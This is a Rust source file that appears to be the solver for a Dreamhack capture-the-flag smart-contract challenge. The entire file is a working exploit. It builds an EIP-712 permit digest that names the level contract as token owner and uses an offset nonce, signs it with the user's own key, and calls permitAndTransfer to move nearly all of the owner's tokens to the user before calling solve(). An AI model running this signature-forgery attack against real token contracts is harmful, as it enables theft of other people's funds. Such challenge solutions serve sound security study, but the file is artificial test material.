use alloy::{
    primitives::{keccak256, Address, B256, U256},
    providers::ProviderBuilder,
    signers::local::PrivateKeySigner,
    signers::SignerSync,
    sol,
    sol_types::SolValue,
};
use dreamhack_utils::challenge::info::{
    fetch_prob_info, get_info_value, read_info_url_from_arguments, rpc_url_from_info_url,
};
use eyre::Result;

sol! {
    #[sol(rpc)]
    interface LevelContract {
        function token() public returns (address);
        function solve() external;
        function solved() public returns (bool);
    }
}

sol! {
    #[sol(rpc)]
    interface TokenContract {
        function nonces(address owner) public returns (uint256);
        function DOMAIN_SEPARATOR() public returns (bytes32);
        function permitAndTransfer(string memory note, address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public;
        function balanceOf(address account) public returns (uint256);
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let info_url = read_info_url_from_arguments()?;
    let info = fetch_prob_info(&info_url).await?;
    let rpc_url = rpc_url_from_info_url(&info_url)?;

    let level_contract_address: Address =
        get_info_value(&info, "level_contract_address")?.parse()?;
    let user_private_key = get_info_value(&info, "user_private_key")?;
    let user_address: Address = get_info_value(&info, "user_address")?.parse()?;

    let user_signer: PrivateKeySigner = user_private_key.parse()?;

    let provider = ProviderBuilder::new()
        .wallet(user_signer.clone())
        .connect_http(rpc_url.parse()?);

    let level_contract = LevelContract::new(level_contract_address, provider.clone());
    let token_address = level_contract.token().call().await?;
    let token_contract = TokenContract::new(token_address, provider.clone());
    let origin = user_address;
    let owner = level_contract_address;
    let spender = user_address;
    let deadline = U256::MAX;

    let domain_separator = token_contract.DOMAIN_SEPARATOR().call().await?;
    let owner_nonce = token_contract.nonces(owner).call().await?;
    let owner_balance = token_contract.balanceOf(owner).call().await?;
    let value = owner_balance - U256::from(1);

    println!("domain_separator: {:#x}", domain_separator);
    println!("owner_nonce: {}", owner_nonce);
    println!("owner_balance: {}", owner_balance);

    // Calculate v, r, s for the permit signature
    let permit2_typehash = keccak256(
        "Permit(address origin,address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)",
    );
    let struct_hash = keccak256(
        (
            permit2_typehash,
            origin,
            owner,
            spender,
            value,
            U256::from(1) + owner_nonce,
            deadline,
        )
            .abi_encode(),
    );

    // EIP-712 digest: keccak256(0x1901 ++ domainSeparator ++ structHash)
    let digest = keccak256(([0x19_u8, 0x01_u8], domain_separator, struct_hash).abi_encode_packed());

    let sig = user_signer.sign_hash_sync(&digest)?;
    let sig_bytes = sig.as_bytes();
    let v = sig_bytes[64];
    let r = B256::from_slice(&sig_bytes[0..32]);
    let s = B256::from_slice(&sig_bytes[32..64]);

    // Off-chain sanity check
    let recovered = sig.recover_address_from_prehash(&digest)?;
    eyre::ensure!(
        recovered == user_address,
        "recovered signer != user_address"
    );

    let _call_permit_and_transfser = token_contract
        .permitAndTransfer(
            "EXPLOITING".to_string(),
            owner,
            spender,
            value,
            deadline,
            v,
            r,
            s,
        )
        .send()
        .await?
        .get_receipt()
        .await?;

    let _call_solve = level_contract.solve().send().await?.get_receipt().await?;
    let solved = level_contract.solved().call().await?;
    assert!(solved, "challenge not solved");
    Ok(())
}
